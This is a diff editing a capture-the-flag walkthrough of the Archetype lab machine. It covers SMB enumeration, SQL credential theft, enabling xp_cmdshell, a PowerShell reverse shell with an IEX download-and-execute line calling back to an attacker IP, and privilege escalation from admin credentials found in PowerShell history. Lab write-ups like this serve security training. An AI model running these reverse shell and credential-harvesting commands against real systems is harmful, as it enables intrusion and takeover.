@@ -3,39 +3,51 @@
 
 ---
 
-## 🔍 Enumeration  
+## Enumeration
 
-We begin by scanning the target with `nmap` using the default script (`-sC`) and version detection (`-sV`):
+**Port scan (default scripts + versions):**
 
 ```bash
 nmap -sC -sV 10.129.92.43
 ```
 
+| Flag | Purpose |
+|------|---------|
+| `-sC` | Run Nmap’s **default** NSE script set (safe discovery) |
+| `-sV` | **Version** and service fingerprinting on open ports |
+
 **Nmap results:**
-```
+```text
 135/tcp  open  msrpc
 139/tcp  open  netbios-ssn
 445/tcp  open  microsoft-ds
 1433/tcp open  ms-sql-s
 ```
 
-### 🔎 SMB Enumeration
+### SMB enumeration
 
-Attempt anonymous login to SMB to list all available shares:
+**List shares without a password** (`-N` = no password prompt; empty guest where allowed):
 
 ```bash
 smbclient -N -L \\\\10.129.92.43\\
 ```
 
+| Pattern | Meaning |
+|---------|---------|
+| `\\\\IP\\` | SMB URL form for `smbclient` (escape backslashes in shell) |
+| `-L` | List shares |
+
 Result shows the `backups` share is available.
 
-### 🔑 Accessing the Backups Share
+### Accessing the Backups Share
 
-We connect directly:
+**Connect to the `backups` share** with an empty username (anonymous / guest context depending on server):
 
 ```bash
 smbclient \\\\10.129.92.43\\backups -U ""
 ```
+
+`-U ""` avoids sending a different account name; if access fails, retry with `-N` per `smbclient` version.
 
 Once inside, we list and download the only interesting file:
 
@@ -58,13 +70,13 @@ This file is a **SQL Server configuration XML file**. It contains the **SQL cred
 </ConfiguredValue>
 ```
 
-✅ Extracted credentials:
+ Extracted credentials:
 - **Username:** ARCHETYPE\sql_svc  
 - **Password:** M3g4c0rp123  
 
 ---
 
-## 🎯 Initial Foothold: MSSQL Access via Impacket
+## Initial Foothold: MSSQL Access via Impacket
 
 Locate `mssqlclient.py` from Impacket:
 
@@ -72,19 +84,24 @@ Locate `mssqlclient.py` from Impacket:
 cd /usr/share/doc/python3-impacket/examples
 ```
 
-Run the client:
+**Impacket MSSQL client** (domain-style login with **Windows authentication**):
 
 ```bash
 python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.92.43 -windows-auth
 ```
 
-You’ll get a `SQL>` prompt if login is successful.
+| Part | Purpose |
+|------|---------|
+| `ARCHETYPE/sql_svc` | `DOMAIN\\user` form for SQL auth |
+| `-windows-auth` | Use **NTLM/Kerberos-style** Windows auth instead of SQL-only login |
+
+On success you receive a `SQL>` prompt.
 
 ---
 
-## 🧨 Enabling RCE via `xp_cmdshell`
+## Enabling RCE via `xp_cmdshell`
 
-By default, command execution via `xp_cmdshell` is disabled. We enable it step-by-step:
+By default **`xp_cmdshell`** is disabled. Enable it from a sufficiently privileged SQL principal:
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -93,14 +110,19 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
-Verify execution:
+| Step | Meaning |
+|------|---------|
+| `show advanced options` | Allows changing extended options such as `xp_cmdshell` |
+| `RECONFIGURE` | Applies pending configuration changes |
+
+**Verify OS command execution:**
 
 ```sql
 EXEC xp_cmdshell 'whoami';
 ```
 
 Should return:
-```
+```text
 archetype\sql_svc
 ```
 
@@ -108,7 +130,7 @@ At this point, **we have command execution as `sql_svc`** via SQL server.
 
 ---
 
-## 🐚 Reverse Shell via PowerShell
+## Reverse Shell via PowerShell
 
 ### Step 1: Create Reverse Shell Payload
 
@@ -128,29 +150,38 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 }
 ```
 
-### Step 2: Host It via Python HTTP Server
+### Step 2: Host `shell.ps1` (attacker)
 
 ```bash
 sudo python3 -m http.server 80
 ```
 
-### Step 3: Start a Listener
+Serves the current directory on **TCP 80**; place `shell.ps1` there. Use a non-privileged port (e.g. `8080`) if 80 is in use.
+
+### Step 3: Listener (attacker)
 
 ```bash
 sudo nc -lvnp 4444
 ```
 
-### Step 4: Execute the Payload from SQL Server
+Must match **IP and port** embedded in `shell.ps1` (`TCPClient("10.10.14.23",4444)` in the snippet above—change both sides consistently).
+
+### Step 4: Pull and execute from SQL Server
 
 ```sql
 EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
 ```
 
-💥 If successful, you now have a **PowerShell reverse shell** back to your Kali machine as `sql_svc`.
+| Fragment | Risk / note |
+|----------|-------------|
+| `IEX(…DownloadString…)` | Downloads and **executes** remote PowerShell—only use against lab targets you own |
+| `Net.WebClient` | Legacy but common in CTF chains; `Invoke-WebRequest` is the modern equivalent |
+
+If outbound HTTP from the SQL host is allowed, you receive a **reverse shell** as `sql_svc`.
 
 ---
 
-## 🕵️‍♂️ Enumerating System and Finding User Flag
+## Enumerating System and Finding User Flag
 
 Once inside:
 
@@ -159,11 +190,11 @@ cd C:\Users\sql_svc\Desktop
 type user.txt
 ```
 
-✅ **User flag captured**
+ **User flag captured**
 
 ---
 
-## 🔐 Privilege Escalation with winPEAS
+## Privilege Escalation with winPEAS
 
 ### Step 1: Upload `winPEAS` to Target
 
@@ -173,11 +204,13 @@ Host it on attacker box:
 sudo python3 -m http.server 80
 ```
 
-On the target system:
+On the target (PowerShell):
 
 ```powershell
 powershell -c "iwr http://10.10.14.23/winPEASx64.exe -outfile winpeas.exe"
 ```
+
+`iwr` (`Invoke-WebRequest`) downloads the binary; adjust URL and filename to the PE release you host.
 
 If it fails, debug output to file:
 
@@ -195,7 +228,7 @@ Inspect `output.txt`.
 
 ---
 
-### 🧠 What We Found
+### What We Found
 
 Inside PowerShell history:
 
@@ -209,17 +242,22 @@ Found:
 net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 ```
 
-🔥 This is **cleartext admin password** for user `administrator`.
+ This is **cleartext admin password** for user `administrator`.
 
 ---
 
-## 👑 Root Shell via Evil-WinRM
+## Root Shell via Evil-WinRM
 
-With the password in hand, connect with Evil-WinRM:
+**Remote management shell** (WinRM, TCP 5985 by default):
 
 ```bash
 evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
 ```
+
+| Flag | Purpose |
+|------|---------|
+| `-i` | Target IP |
+| `-u` / `-p` | Credentials (quote password if it contains shell metacharacters) |
 
 Once inside:
 
@@ -228,11 +266,11 @@ cd C:\Users\Administrator\Desktop
 type root.txt
 ```
 
-✅ **Root flag captured**
+ **Root flag captured**
 
 ---
 
-## ✅ Summary of Steps
+## Summary of Steps
 
 1. `nmap` reveals SMB and MSSQL
 2. Anonymous access to `\\backups\` yields `prod.dtsConfig`
@@ -244,17 +282,17 @@ type root.txt
 8. Find `administrator` password in PowerShell history
 9. Connect with `evil-winrm` and grab the root flag
 
-🎉 **Box Complete: ARCHEtype Destroyed!**
+**Lab status:** all flags and steps above completed for Archetype.
 
 ---
 
-## 🧭 Alternate Path - My Custom Exploitation Route
+## Alternate path — PowerShell-only reverse shell
 
-While the official guide used the `nc64.exe` binary to obtain a reverse shell, **my process differed in several key ways**, offering an equally effective but alternative approach. Here's how my path diverged:
+Some write-ups use **`nc64.exe`** on the target; the path documented in the main section uses a **hosted `shell.ps1`** and **`IEX(DownloadString)`** instead—no third-party binary on disk beyond what PowerShell loads in memory.
 
-### 🧃 Reverse Shell via PowerShell Script Injection Instead of Binary Upload
+### Hosted reverse shell (same `shell.ps1` pattern)
 
-Instead of uploading and executing `nc64.exe`, I hosted and injected a **custom PowerShell reverse shell script** (`shell.ps1`) using `xp_cmdshell` and PowerShell’s `IEX` with `Net.WebClient.DownloadString`:
+Hosted and injected **PowerShell reverse shell** via `xp_cmdshell`:
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",4444);
@@ -276,13 +314,13 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
 ```
 
-🔁 This gave me an **interactive reverse PowerShell shell** over TCP **without needing to upload any binaries**.
+This yields an **interactive PowerShell** session over TCP without placing a separate netcat binary on the server.
 
 ---
 
-### 🗃️ Directory Traversal to Access Writeable Path
+### Finding a writable directory
 
-To find a writeable path from the limited SQL context, I manually traversed with:
+From a constrained SQL-driven shell, traverse toward user-writable locations:
 
 ```powershell
 cd ../../../
@@ -294,13 +332,13 @@ Eventually landing at:
 C:\Users\sql_svc\Downloads
 ```
 
-This is where I downloaded `winpeas.ps1`.
+Typical location to stage **`winPEAS`** or other tools.
 
 ---
 
-### ⚙️ Troubleshooting winPEAS Execution
+### Troubleshooting winPEAS
 
-My first download of winPEAS failed. To debug, I redirected the output to a file:
+If the first download is corrupt or execution errors appear, capture stderr/stdout:
 
 ```powershell
 powershell -ep Bypass .\winpeas.ps1 *> output.txt
@@ -312,30 +350,30 @@ Upon discovering corruption, I re-downloaded the script and re-ran:
 powershell -ep Bypass .\winpeas.ps1 > output.txt
 ```
 
-This led to successful execution and discovery of credentials.
+Re-download if needed, then review `output.txt` for **credentials**, **weak services**, and **privilege escalation** hints.
 
 ---
 
-### 🧾 Extracting the Admin Password via PowerShell History
+### Administrator password in PSReadLine history
 
-Using:
+Read the same history file as in the main section:
 
 ```powershell
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-I retrieved the **Administrator credentials**:
+Example material stored in history (lab-specific):
 
-```
+```text
 Username: administrator
 Password: MEGACORP_4dm1n!!
 ```
 
 ---
 
-### 🛡️ Root Access via Evil-WinRM Instead of psexec.py
+### Root access via Evil-WinRM (alternative to `psexec.py`)
 
-Instead of Impacket’s `psexec.py`, I used `evil-winrm` for a more interactive shell:
+`psexec.py` is another valid option; **`evil-winrm`** often gives a cleaner **WinRM** shell when port **5985** is open:
 
 ```bash
 evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
@@ -348,6 +386,7 @@ cd C:\Users\Administrator\Desktop
 type root.txt
 ```
 
-🏁 **Root flag captured using Evil-WinRM!**
+**Root flag:** retrieved from `Administrator\\Desktop` as in the main section.
 
 ---
+
